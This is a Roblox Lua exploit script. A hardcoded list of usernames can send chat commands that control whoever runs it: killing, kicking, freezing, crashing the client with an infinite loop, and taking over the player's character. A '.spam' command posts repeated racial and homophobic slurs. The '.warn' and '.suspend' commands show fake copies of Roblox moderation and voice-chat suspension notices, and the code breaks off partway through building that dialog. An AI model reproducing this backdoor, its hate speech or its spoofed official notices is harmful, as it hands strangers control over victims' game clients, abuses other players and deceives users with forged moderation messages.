local Players = game:GetService("Players")
local Player = Players.LocalPlayer
-- **Kommentiere die fehlerhafte Zeile und die Controls-Variable aus**
-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-- local Controls = PlayerModule:GetControls()

-- **Ersetze setControlsEnabled durch eine einfachere Funktion, die Anchored verwendet**
local function setControlsEnabled(enabled)
    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        Player.Character.HumanoidRootPart.Anchored = not enabled -- Umgekehrt, da true = deaktiviert
    end
end

local function follow(onoff,pos)
getgenv().flwwing = onoff
while wait() do
if getgenv().flwwing then
setControlsEnabled(false) -- Verwende die neue Funktion
else
setControlsEnabled(true) -- Verwende die neue Funktion
break
end
wait()
game.Players.LocalPlayer.Character.Humanoid:MoveTo(pos)
end
end
local function nameMatches(player, partialName)
    local nameLower = player.Name:lower()
    local displayNameLower = player.DisplayName:lower()
    partialName = partialName:lower()

    -- Exact matches
    if nameLower == partialName or displayNameLower == partialName then
        return true
    end

    -- Partial matches
    if nameLower:find(partialName, 1, true) or displayNameLower:find(partialName, 1, true) then
        return true
    end

    return false
end

local adminCmd = {
    "AK_ADMEN1", "I_LOVEYOU12210", "KRZXY_9", "Xeni_he07", "I_LOVEYOU11210", "AK_ADMEN2", "GYATT_DAMN1", "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD", "AK_ADMEN2", "BloxiAstra", "29Kyooo", "ImOn_ValveIndex", "328ml", "BasedLion25", "Akksosdmdokdkddmkd", "BOTGTMPStudio2", "damir123loin", "goekayhack", "goekayball", "goekayball2", "goetemp_1", "Whitelisttestingg", "Robloxian74630436", "sheluvstutu", "browhatthebadass" , "SunSetzDown", "TheSadMan198", "FellFlower2", "xXLuckyXx187", "lIIluckyIIII"
}

local commandsList = {
    ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
    ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
    ".kick", ".kill", ".bring", ".js", ".js2", ".invert",
    ".uninvert", ".spin", ".unspin",
    ".privland",
    ".crash", ".smartwalktome", ".walktome", ".control", ".uncontrol", ".fling",
    ".follow", ".unfollow", ".spam", ".warn", ".suspend", ".knock", ".scare"
}

local frozenPlayers = {}
local controlInversionActive = {}
local spinActive = {}
local jumpDisabled = {}

local function Chat(msg)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = msg,
        Color = Color3.new(1, 0, 0),
        Font = Enum.Font.SourceSans,
        FontSize = Enum.FontSize.Size24,
    })
end

local function createCommandGui(player)
    local gui = Instance.new("ScreenGui", player.PlayerGui)
    gui.Name = "CommandGui"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.3, 0, 0.4, 0) -- Smaller GUI
    frame.Position = UDim2.new(0.35, 0, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.Text = "Owner Commands"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24

    local scrollFrame = Instance.new("ScrollingFrame", frame)
    scrollFrame.Size = UDim2.new(1, 0, 0.8, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0.1, 0)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 5, 0) -- Adjust for commands

    local layout = Instance.new("UIListLayout", scrollFrame)
    layout.Padding = UDim.new(0, 5)

    for _, command in ipairs(commandsList) do
        local commandLabel = Instance.new("TextLabel", scrollFrame)
        commandLabel.Size = UDim2.new(1, 0, 0, 30)
        commandLabel.Text = command
        commandLabel.TextColor3 = Color3.new(1, 1, 1)
        commandLabel.BackgroundTransparency = 1
        commandLabel.Font = Enum.Font.SourceSans
        commandLabel.TextSize = 20
    end

    local closeButton = Instance.new("TextButton", frame)
    closeButton.Size = UDim2.new(0.3, 0, 0.1, 0)
    closeButton.Position = UDim2.new(0.35, 0, 0.9, 0)
    closeButton.Text = "Close"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.SourceSans
    closeButton.TextSize = 18

    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- Make the frame draggable
    local dragging, dragInput, dragStart, startPos
    local UIS = game:GetService("UserInputService")

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Execute the command on the specific target
local function executeCommand(admin, target, command)
    if admin.Name == target.Name then
        Chat("You cannot target yourself!")
        return
    end

    if command == ".kill" then
        target.Character.Humanoid.Health = 0
    elseif command == ".bring" then
        target.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
    else
        Chat("Command not recognized or not implemented.")
    end
end

-- Admin command handling
local function setupAdminCommands(admin)
    admin.Chatted:Connect(function(msg)
        msg = msg:lower()
        local command, targetPartialName = msg:match("^(%S+)%s+(.*)$")
        if not command or not targetPartialName then
            command = msg -- If no target name is specified, just check the command
        end

        -- Get the target player if a name was specified
        local targetPlayer
        if targetPartialName then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if nameMatches(p, targetPartialName) then
                    targetPlayer = p
                    break
                end
            end
        end

        local player = game.Players.LocalPlayer
        -- Only process commands without targets, or commands where this player is the target
        if not targetPartialName or (targetPlayer and targetPlayer == player) then
            -- Admin Commands
            if command == ".ownercmds" then
                createCommandGui(player)
            elseif command == ".rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
            elseif command == ".fast" then
                player.Character.Humanoid.WalkSpeed = 50
            elseif command == ".normal" then
                player.Character.Humanoid.WalkSpeed = 16
            elseif command == ".slow" then
                player.Character.Humanoid.WalkSpeed = 5
            elseif command == ".privland" then
-- Teleport Script
local teleportPosition = Vector3.new(9998, 10051, 10002)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function teleport()
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
    else
        warn("Character or HumanoidRootPart not found!")
    end
end

-- Call the teleport function
teleport()
            elseif command == ".unfloat" then
                player.Character.HumanoidRootPart.Anchored = false
            elseif command == ".float" then
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                wait(0.3)
                player.Character.HumanoidRootPart.Anchored = true
            elseif command == ".void" then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
            elseif command == ".jump" then
                player.Character.Humanoid.Jump = true



elseif command == ".trip" then
               local humanoid = player.Character.Humanoid
local hrp = player.Character.HumanoidRootPart
-- Create banana MeshPart
local banana = Instance.new("MeshPart")
banana.MeshId = "rbxassetid://7076530645"
banana.TextureID = "rbxassetid://7076530688"
banana.Size = Vector3.new(0.7, 1, 0.8) -- Made banana bigger
banana.Anchored = true
banana.CanCollide = false
banana.Parent = workspace
-- Create slip sound
local slipSound = Instance.new("Sound")
slipSound.SoundId = "rbxassetid://8317474936"
slipSound.Volume = 1
slipSound.Parent = hrp
-- Use raycast to find floor position
local rayOrigin = hrp.Position + Vector3.new(0, 0, -2)
local rayDirection = Vector3.new(0, -10, 0)
local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
if raycastResult then
    -- Place banana sideways with a 90-degree rotation on X axis
    banana.CFrame = CFrame.new(raycastResult.Position)
        * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
else
    banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
end
   -- Create and configure the forward movement tween
    local tweenService = game:GetService("TweenService")
    local forwardTweenInfo = TweenInfo.new(
        0.3, -- Duration
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )

    -- Move character forward
    local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
    local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
    forwardTween:Play()

    -- Wait for forward movement to complete
    task.wait(0.3)

    -- Create and configure the arc falling tween
    local fallTweenInfo = TweenInfo.new(
        0.6, -- Longer duration for arc motion
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.In -- Changed to In for better arc effect
    )

    -- Tween the character's position and rotation in an arc
    local fallGoal = {
        CFrame = hrp.CFrame
        * CFrame.new(0, -0.5, -4) -- Move forward and down
        * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
    }
    local fallTween = tweenService:Create(hrp, fallTweenInfo, fallGoal)
    fallTween:Play()
humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
task.wait(2)
humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
task.wait(0.5)
humanoid:ChangeState(Enum.HumanoidStateType.None)
task.wait(1)
banana:Destroy()
slipSound:Destroy()
            elseif command == ".sit" then
                player.Character.Humanoid.Sit = true
            elseif command == ".crash" then
		getgenv().crash=true
		if getgenv().crash then
		while true do end
		end


elseif command == ".smartwalktome" then
        -- **Keine Änderung an smartwalktome, da es PlayerModule nicht direkt verwendet**
        local Pathfind = game:GetService("PathfindingService")
local Humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
local Torso = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
local Path = Pathfind:CreatePath()
local GenPoint = nil
local PointArray = {}
local Folder = Instance.new("Folder")
Folder.Name = "Waypoints"
Folder.Parent = workspace
setControlsEnabled(false) -- Verwende die neue Funktion
Path:ComputeAsync(Torso.Position, admin.Character.HumanoidRootPart.Position)

local Waypoints = Path:GetWaypoints()

for i, v in ipairs(Waypoints) do

    GenPoint = v

    table.insert(PointArray, GenPoint)

    local Point = Instance.new("Part")
    Point.Anchored = true
    Point.Shape = "Ball"
    Point.Size = Vector3.one*0.5
    Point.Position = v.Position + Vector3.new(0,2,0)
    Point.CanCollide = false
    Point.Parent = workspace.Waypoints
    Point.Name = "Point"..tostring(i)
end

for i2, v2 in ipairs(PointArray) do

    if v2.Action == Enum.PathWaypointAction.Jump then
        Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end

    Humanoid:MoveTo(v2.Position)
    Humanoid.MoveToFinished:Wait()
    workspace.Waypoints["Point"..tostring(i2)].BrickColor = BrickColor.new("Camo")
    workspace.Waypoints["Point"..tostring(i2)].Material = "Neon"
end
setControlsEnabled(true) -- Verwende die neue Funktion
game.Workspace.Waypoints:Destroy()
        elseif command == ".walktome" then

        -- **Keine Änderung an walktome, da es PlayerModule nicht direkt verwendet**
local targetPart = admin.Character:WaitForChild("HumanoidRootPart") -- Replace "sdfsf" with your part's name if needed
local character = Player.Character or Player.CharacterAdded:Wait()


-- Function to move character to a target part
local function moveToPart(part)
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid

        -- Disable controls
        setControlsEnabled(false) -- Verwende die neue Funktion

        -- Move to the target part
        humanoid:MoveTo(part.Position)

        -- Wait until the character reaches the destination or time out after 10 seconds
        local reached = humanoid.MoveToFinished:Wait()
        if reached then
        else
        end

        -- Re-enable controls
        setControlsEnabled(true) -- Verwende die neue Funktion
    end
end

-- Example usage: Move the character to the part when the script runs
moveToPart(targetPart)

            elseif command == ".control" then
            local function disableSeat(seat)
    if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
        seat.Disabled = true
        seat.CanCollide = false
    end
end

for _, seat in game.Workspace:GetDescendants() do
    disableSeat(seat)
end

game.Workspace.DescendantAdded:Connect(disableSeat)
-- **Kommentiere PlayerModule-bezogenen Code in .control aus**
-- local Players = game:GetService("Players")
-- local Player = Players.LocalPlayer
-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))

-- -- Get the control module
-- local Controls = PlayerModule:GetControls()

-- -- Disable controls
-- Controls:Disable()
setControlsEnabled(false) -- Verwende die neue Funktion

-- Ensure this script is a LocalScript
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- Global Control Variable
getgenv().controlling = true

-- References to Player and Target
local player = Players.LocalPlayer
local targetPlayer = admin -- Replace 'admin' with target name

-- Validate target player exists
if not targetPlayer then
    warn("Target player not found!")
    return
end

-- Character References
local character = player.Character or player.CharacterAdded:Wait()
local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()

-- Character Components
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")
local targetHumanoidRootPart = targetCharacter:WaitForChild("HumanoidRootPart")
local targetHumanoid = targetCharacter:WaitForChild("Humanoid")

-- Configuration Parameters
local sideOffset = 5            -- Distance to maintain to the side
local smoothingFactor = 0.2     -- Interpolation smoothness (0-1)
local maxSpeed = 50             -- Maximum movement speed
local jumpEnabled = false       -- Disabled jumping to stay grounded
local rayHeight = 2         -- Height of floor detection ray
local floorOffset = 3        -- Distance to maintain above ground

-- Initialize Movement Variables
local targetPosition = targetHumanoidRootPart.Position
local targetCFrame = targetHumanoidRootPart.CFrame
local currentPos = humanoidRootPart.Position
local velocity = Vector3.new(0, 0, 0)

-- Floor Detection Function
local function getFloorHeight(position)
    local rayStart = Vector3.new(position.X, position.Y + rayHeight, position.Z)
    local rayEnd = Vector3.new(position.X, position.Y - rayHeight, position.Z)

    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    raycastParams.FilterDescendantsInstances = {character, targetCharacter}

    local raycastResult = workspace:Raycast(rayStart, rayEnd - rayStart, raycastParams)

    if raycastResult then
        return raycastResult.Position.Y + floorOffset
    end
    return position.Y
end
-- Main Control Loop
RunService.RenderStepped:Connect(function(deltaTime)
    if not getgenv().controlling then return end

    -- Safety check for character existence
    if not character.Parent or not targetCharacter.Parent then
        return
    end

    -- Update Target Position
    targetPosition = targetHumanoidRootPart.Position
    targetCFrame = targetHumanoidRootPart.CFrame

    -- Calculate Side Position
    local rightDirection = (targetCFrame.RightVector).Unit
    local desiredPosition = targetPosition + (rightDirection * sideOffset)

    -- Get Floor Height at Desired Position
    local floorHeight = getFloorHeight(desiredPosition)
    desiredPosition = Vector3.new(desiredPosition.X, floorHeight, desiredPosition.Z)

    -- Smooth Movement Calculation
    currentPos = humanoidRootPart.Position
    local newPos = currentPos:Lerp(desiredPosition, smoothingFactor)

    -- Velocity Calculation with Speed Limit
    velocity = (newPos - currentPos) / deltaTime
    if velocity.Magnitude > maxSpeed then
        velocity = velocity.Unit * maxSpeed
    end

    -- Apply Movement
    humanoidRootPart.Velocity = velocity

    -- Synchronize Orientation
    local targetOrientation = targetCFrame - targetCFrame.Position
    humanoidRootPart.CFrame = CFrame.new(newPos) * targetOrientation

    -- Force Y Velocity to prevent floating
    humanoidRootPart.Velocity = Vector3.new(
        humanoidRootPart.Velocity.X,
        math.min(humanoidRootPart.Velocity.Y, 0), -- Only allow downward vertical movement
        humanoidRootPart.Velocity.Z
    )
end)

-- Disable Jump
humanoid.Jump = false
            elseif command == ".uncontrol" then
            getgenv().controlling=false
            -- **Kommentiere PlayerModule-bezogenen Code in .uncontrol aus**
            -- local Players = game:GetService("Players")
            -- local Player = Players.LocalPlayer
            -- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))

            -- -- Get the control module
            -- local Controls = PlayerModule:GetControls()

            -- -- Disable controls
            -- Controls:Enable()
            setControlsEnabled(true) -- Verwende die neue Funktion
            local function enableSeat(seat)
    if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
        seat.Disabled = false
        seat.CanCollide = true
    end
end

for _, seat in game.Workspace:GetDescendants() do
    enableSeat(seat)
end

game.Workspace.DescendantAdded:Connect(enableSeat)
            elseif command == ".fling" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(250,250,250)
                game.Players.LocalPlayer.Character.Humanoid.Sit=true
            elseif command == ".freeze" then
                player.Character.HumanoidRootPart.Anchored = true
                frozenPlayers[player.UserId] = true
            elseif command == ".unfreeze" then
                for userId in pairs(frozenPlayers) do
                    local frozenPlayer = game.Players:GetPlayerByUserId(userId)
                    if frozenPlayer and frozenPlayer.Character then
                        frozenPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                frozenPlayers = {}
            elseif command == ".kick" then
                player:Kick("Kicked")
            elseif command == ".follow" then
            follow(true,admin.Character.HumanoidRootPart.Position)
            elseif command == ".unfollow" then
            follow(false,admin.Character.HumanoidRootPart.Position) -- Korrektur: unfollow sollte false übergeben
            elseif command == ".spam" then
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            elseif command == ".warn" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local RobloxVoiceChatPromptGui = Instance.new("ScreenGui")
local Content = Instance.new("Frame")
local Toast1 = Instance.new("Frame")
local ToastContainer = Instance.new("TextButton")
local UISizeConstraint = Instance.new("UISizeConstraint")
local Toast = Instance.new("ImageLabel")
local ToastFrame = Instance.new("Frame")
local UIListLayout2 = Instance.new("UIListLayout")
local ToastMessageFrame = Instance.new("Frame")
local UIListLayout3 = Instance.new("UIListLayout")
local ToastTextFrame = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local ToastTitle = Instance.new("TextLabel")
local ToastSubtitle = Instance.new("TextLabel")
local ToastIcon = Instance.new("ImageLabel")
local UIPadding = Instance.new("UIPadding")
local Scaler = Instance.new("UIScale")

--Properties:

RobloxVoiceChatPromptGui.Name = "RobloxVoiceChatPromptGui"
RobloxVoiceChatPromptGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
RobloxVoiceChatPromptGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
RobloxVoiceChatPromptGui.DisplayOrder = 9

Content.Name = "Content"
Content.Parent = RobloxVoiceChatPromptGui
Content.BackgroundTransparency = 1.000
Content.Size = UDim2.new(1, 0, 1, 0)

Toast1.Name = "Toast1"
Toast1.Parent = Content
Toast1.BackgroundTransparency = 1.000
Toast1.Size = UDim2.new(1, 0, 1, 0)

ToastContainer.Name = "ToastContainer"
ToastContainer.Parent = Toast1
ToastContainer.AnchorPoint = Vector2.new(0.5, 0)
ToastContainer.BackgroundTransparency = 1.000
ToastContainer.Position = UDim2.new(0.5, 0, 0, -148)
ToastContainer.Size = UDim2.new(1, -24, 0, 93)
ToastContainer.Text = ""

UISizeConstraint.Parent = ToastContainer
UISizeConstraint.MaxSize = Vector2.new(400, math.huge)
UISizeConstraint.MinSize = Vector2.new(24, 60)

Toast.Name = "Toast"
Toast.Parent = ToastContainer
Toast.AnchorPoint = Vector2.new(0.5, 0.5)
Toast.BackgroundTransparency = 1.000
Toast.BorderSizePixel = 0
Toast.LayoutOrder = 1
Toast.Position = UDim2.new(0.5, 0, 0.5, 0)
Toast.Size = UDim2.new(1, 0, 1, 0)
Toast.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_2.png"
Toast.ImageColor3 = Color3.fromRGB(57, 59, 61)
Toast.ImageRectOffset = Vector2.new(490, 267)
Toast.ImageRectSize = Vector2.new(21, 21)
Toast.ScaleType = Enum.ScaleType.Slice
Toast.SliceCenter = Rect.new(10, 10, 11, 11)

ToastFrame.Name = "ToastFrame"
ToastFrame.Parent = Toast
ToastFrame.BackgroundTransparency = 1.000
ToastFrame.BorderSizePixel = 0
ToastFrame.ClipsDescendants = true
ToastFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout2.Name = "UIListLayout2"
UIListLayout2.Parent = ToastFrame
UIListLayout2.FillDirection = Enum.FillDirection.Horizontal
UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout2.Padding = UDim.new(0, 12)

ToastMessageFrame.Name = "ToastMessageFrame"
ToastMessageFrame.Parent = ToastFrame
ToastMessageFrame.BackgroundTransparency = 1.000
ToastMessageFrame.BorderSizePixel = 0
ToastMessageFrame.LayoutOrder = 1
ToastMessageFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout3.Name = "UIListLayout3"
UIListLayout3.Parent = ToastMessageFrame
UIListLayout3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout3.Padding = UDim.new(0, 12)

ToastTextFrame.Name = "ToastTextFrame"
ToastTextFrame.Parent = ToastMessageFrame
ToastTextFrame.BackgroundTransparency = 1.000
ToastTextFrame.LayoutOrder = 2
ToastTextFrame.Size = UDim2.new(1, -48, 0, 69)

UIListLayout.Parent = ToastTextFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ToastTitle.Name = "ToastTitle"
ToastTitle.Parent = ToastTextFrame
ToastTitle.BackgroundTransparency = 1.000
ToastTitle.LayoutOrder = 1
ToastTitle.Size = UDim2.new(1, 0, 0, 22)
ToastTitle.Font = Enum.Font.BuilderSansBold
ToastTitle.Text = "Remember our policies"
ToastTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastTitle.TextSize = 20.000
ToastTitle.TextWrapped = true
ToastTitle.TextXAlignment = Enum.TextXAlignment.Left

ToastSubtitle.Name = "ToastSubtitle"
ToastSubtitle.Parent = ToastTextFrame
ToastSubtitle.BackgroundTransparency = 1.000
ToastSubtitle.LayoutOrder = 2
ToastSubtitle.Size = UDim2.new(1, 0, 0, 47)
ToastSubtitle.Font = Enum.Font.BuilderSans
ToastSubtitle.Text = "We've detected language that may violate Roblox's Community Standards. You may lose access to Chat with Voice after multiple violations."
ToastSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastSubtitle.TextSize = 15.000
ToastSubtitle.TextWrapped = true
ToastSubtitle.TextXAlignment = Enum.TextXAlignment.Left

ToastIcon.Name = "ToastIcon"
ToastIcon.Parent = ToastMessageFrame
ToastIcon.BackgroundTransparency = 1.000
ToastIcon.LayoutOrder = 1
ToastIcon.Size = UDim2.new(0, 36, 0, 36)
ToastIcon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
ToastIcon.ImageRectOffset = Vector2.new(248, 386)
ToastIcon.ImageRectSize = Vector2.new(36, 36)

UIPadding.Parent = ToastFrame
UIPadding.PaddingBottom = UDim.new(0, 12)
UIPadding.PaddingLeft = UDim.new(0, 12)
UIPadding.PaddingRight = UDim.new(0, 12)
UIPadding.PaddingTop = UDim.new(0, 12)

Scaler.Name = "Scaler"
Scaler.Parent = Toast


-- Create TweenInfo for smooth animation
local tweenInfo = TweenInfo.new(
    0.2, -- Duration (0.5 seconds)
    Enum.EasingStyle.Quad,
    Enum.EasingDirection.Out
)

-- Get TweenService
local TweenService = game:GetService("TweenService")

-- Define positions
local outPos = UDim2.new(0.5, 0, 0, -35)
local inPos = UDim2.new(0.5, 0, 0, -148)

-- Create tween to out position
local tweenOut = TweenService:Create(ToastContainer, tweenInfo, {
    Position = outPos
})

-- Create tween to in position
local tweenIn = TweenService:Create(ToastContainer, tweenInfo, {
    Position = inPos
})

-- Play the sequence
tweenOut:Play()
wait(6.5) -- Wait for 6.5 seconds
tweenIn:Play()
tweenIn.Completed:Wait() -- Wait for tween to complete
RobloxVoiceChatPromptGui:Destroy() -- Destroy the GUI

elseif command == ".suspend" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local InGameMenuInformationalDialog = Instance.new("ScreenGui")
local DialogMainFrame = Instance.new("ImageLabel")
local Divider = Instance.new("Frame")
local SpaceContainer2 = Instance.new("Frame")
local TitleTextContainer = Instance.new("Frame")
local TitleText = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local ButtonContainer = Instance.new("Frame")
local Layout = Instance.new("UIListLayout")
local TextSpaceContainer = Instance.new("Frame")
local SubBodyTextContainer = Instance.new("Frame")
local BodyText = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local BodyTextContainer = Instance.new("Frame")
local BodyText_2 = Instance.new("TextLabel")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local WarnText = Instance.new("TextLabel")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local Padding = Instance.new("UIPadding")
local Icon = Instance.new("ImageLabel")
local DividerSpaceContainer = Instance.new("Frame")
local Overlay = Instance.new("TextButton")
local ConfirmButton = Instance.new("ImageButton")
local ButtonContent = Instance.new("Frame")
local ButtonMiddleContent = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Text = Instance.new("TextLabel")
local SecondaryButton = Instance.new("ImageButton")
local sizeConstraint = Instance.new("UISizeConstraint")
local textLabel = Instance.new("TextLabel")
local SecondaryButton_2 = Instance.new("ImageButton")
local sizeConstraint_2 = Instance.new("UISizeConstraint")
local textLabel_2 = Instance.new("TextLabel")

--Properties:

InGameMenuInformationalDialog.Name = "InGameMenuInformationalDialog"
InGameMenuInformationalDialog.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
InGameMenuInformationalDialog.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
InGameMenuInformationalDialog.DisplayOrder = 8

DialogMainFrame.Name = "DialogMainFrame"
DialogMainFrame.Parent = InGameMenuInformationalDialog
DialogMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
DialogMainFrame.BackgroundTransparency = 1.000
DialogMainFrame.Position = UDim2.new(0.5, 0, 0.50000006, 0)
DialogMainFrame.Size = UDim2.new(0, 365, 0, 371)
DialogMainFrame.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
DialogMainFrame.ImageColor3 = Color3.fromRGB(57, 59, 61)
DialogMainFrame.ImageRectOffset = Vector2.new(402, 494)
DialogMainFrame.ImageRectSize = Vector2.new(17, 17)
DialogMainFrame.ScaleType = Enum.ScaleType.Slice
DialogMainFrame.SliceCenter = Rect.new(8, 8, 9, 9)

Divider.Name = "Divider"
Divider.Parent = DialogMainFrame
Divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Divider.BackgroundTransparency = 0.800
Divider.BorderSizePixel = 0
Divider.LayoutOrder = 3
Divider.Position = UDim2.new(0.0984615386, 0, 0.268882185, 0)
Divider.Size = UDim2.new(0.800000012, 0, 0, 1)

SpaceContainer2.Name = "SpaceContainer2"
SpaceContainer2.Parent = DialogMainFrame
SpaceContainer2.BackgroundTransparency = 1.000
SpaceContainer2.LayoutOrder = 8
SpaceContainer2.Size = UDim2.new(1, 0, 0, 10)

TitleTextContainer.Name = "TitleTextContainer"
TitleTextContainer.Parent = DialogMainFrame
TitleTextContainer.BackgroundTransparency = 1.000
TitleTextContainer.LayoutOrder = 2
TitleTextContainer.Size = UDim2.new(1, 0, 0, 45)

TitleText.Name = "TitleText"
TitleText.Parent = TitleTextContainer
TitleText.BackgroundTransparency = 1.000
TitleText.Position = UDim2.new(0, 0, 0.514710903, 0)
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.BuilderSansBold
TitleText.LineHeight = 1.400
TitleText.Text = "Voice chat suspended"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextScaled = true
TitleText.TextSize = 25.000
TitleText.TextWrapped = true

UITextSizeConstraint.Parent = TitleText
UITextSizeConstraint.MaxTextSize = 25
UITextSizeConstraint.MinTextSize = 20

ButtonContainer.Name = "ButtonContainer"
ButtonContainer.Parent = DialogMainFrame
ButtonContainer.BackgroundTransparency = 1.000
ButtonContainer.LayoutOrder = 9
ButtonContainer.Size = UDim2.new(1, 0, 0, 36)

Layout.Name = "Layout"
Layout.Parent = ButtonContainer
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
